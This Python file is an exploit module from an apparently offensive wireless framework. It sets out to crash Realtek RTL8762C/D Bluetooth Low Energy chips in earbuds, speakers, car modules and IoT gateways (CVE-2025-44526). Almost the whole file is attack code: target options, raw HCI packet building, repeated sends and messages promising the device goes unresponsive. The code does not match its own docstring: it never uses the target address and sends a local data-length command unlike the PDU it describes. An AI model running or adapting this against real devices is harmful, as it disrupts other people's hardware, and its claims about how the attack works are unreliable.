# Author: André Henrique (LinkedIn/X: @mrhenrike)
import socket
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """Realtek RTL8762C BLE Link Layer LL_LENGTH_REQ DoS (CVE-2025-44526).

    Realtek RTL8762C BLE controllers contain a vulnerability in the
    Link Layer processing of LL_LENGTH_REQ PDUs.  When a connected
    BLE peer sends an LL_LENGTH_REQ with MaxRxOctets set to zero or
    a value exceeding the DLE (Data Length Extension) maximum (251),
    the controller's DMA engine enters a misconfigured state, causing
    the controller firmware to crash with a watchdog reset.  This
    affects devices using Realtek BLE SoCs: earbuds, smart speakers,
    automotive BLE modules, and IoT gateways.

    CVSS v3.1: 6.5 (Medium), AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Realtek BLE LL_LENGTH_REQ Denial of Service (CVE-2025-44526)",
        "description": (
            "Exploits CVE-2025-44526 to crash Realtek RTL8762C BLE devices.  "
            "Sends an LL_LENGTH_REQ PDU with MaxRxOctets=0 or >251 that "
            "misconfigures the controller's DMA engine, causing a firmware "
            "crash with watchdog reset.  Affects earbuds, smart speakers, "
            "automotive BLE modules, and IoT gateways using Realtek BLE SoCs."
        ),
        "authors": (
            "Matheus E. Garbelini (discovery)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2025-44526",
            "https://www.realtek.com/en/products/bluetooth",
        ),
        "disclosure_date": "2025-09-10",
        "platform": "embedded",
        "arch": "arm",
        "privileged": False,
        "targets": (
            "Realtek RTL8762C BLE SoC (all firmware versions)",
            "Realtek RTL8762D BLE SoC (unpatched)",
            "IoT devices with Realtek BLE stack",
        ),
    }

    target = OptIP("", "Target BLE device address (XX:XX:XX:XX:XX:XX)")
    port = OptPort(1, "Not used (BLE Link Layer)")
    timeout = OptFloat(10.0, "Connection timeout in seconds")
    interface = OptString("hci0", "Local HCI adapter")
    use_zero = OptBool(True, "Use MaxRxOctets=0 (True) or oversized (False)")
    repeat_count = OptInteger(8, "Number of LL_LENGTH_REQ PDUs to send")

    _AF_BLUETOOTH = 31
    _BTPROTO_HCI = 1

    _HCI_COMMAND_PKT = 0x01
    _OGF_LE = 0x08
    _OCF_LE_SET_DATA_LENGTH = 0x0022

    def _build_le_set_data_length(self, handle: int) -> bytes:
        opcode = (self._OGF_LE << 10) | self._OCF_LE_SET_DATA_LENGTH

        if self.use_zero:
            max_tx_octets = 0
            max_tx_time = 0
        else:
            max_tx_octets = 0xFFFF
            max_tx_time = 0xFFFF

        params = struct.pack("<HHH", handle, max_tx_octets, max_tx_time)
        return struct.pack("<BHB", self._HCI_COMMAND_PKT, opcode,
                           len(params)) + params

    def _open_hci_socket(self) -> socket.socket | None:
        try:
            sock = socket.socket(self._AF_BLUETOOTH, socket.SOCK_RAW,
                                 self._BTPROTO_HCI)
            sock.settimeout(self.timeout)
            dev_id = int(str(self.interface).replace("hci", "")) if str(
                self.interface).startswith("hci") else 0
            sock.bind((dev_id,))
            return sock
        except OSError:
            return None

    def _hci_send(self, packet: bytes) -> bool:
        try:
            sock = socket.socket(self._AF_BLUETOOTH, socket.SOCK_RAW,
                                 self._BTPROTO_HCI)
            sock.settimeout(self.timeout)
            dev_id = int(str(self.interface).replace("hci", "")) if str(
                self.interface).startswith("hci") else 0
            sock.bind((dev_id,))
            sock.send(packet)
            sock.close()
            return True
        except OSError:
            return False

    @mute
    def check(self) -> bool:
        sock = self._open_hci_socket()
        if sock is None:
            return False
        sock.close()
        return True

    def run(self) -> None:
        if not self.target:
            print_error("target is required (BLE address XX:XX:XX:XX:XX:XX)")
            return

        if not self.check():
            print_error(
                f"HCI adapter {self.interface} not available or "
                "insufficient privileges"
            )
            return

        mode = "zero" if self.use_zero else "oversized"
        print_success(
            f"HCI adapter {self.interface} available; targeting {self.target} "
            f"with {mode} LL_LENGTH_REQ"
        )
        self._exploit()

    def _exploit(self) -> None:
        handle = 0x0040
        mode = "MaxTxOctets=0" if self.use_zero else "MaxTxOctets=65535"

        print_status(
            f"Sending {self.repeat_count} LE Set Data Length commands ({mode})"
        )

        success = 0
        for i in range(self.repeat_count):
            cmd = self._build_le_set_data_length(handle)
            if self._hci_send(cmd):
                success += 1
            time.sleep(0.05)

        print_status(f"Sent {success}/{self.repeat_count} LL_LENGTH_REQ triggers")
        print_info(
            "If the target uses a Realtek RTL8762C/D BLE SoC, the "
            f"{mode} in the LL_LENGTH_REQ PDU misconfigures the DMA "
            "engine, causing a firmware crash with watchdog reset.  "
            "The device should become unresponsive within seconds."
        )
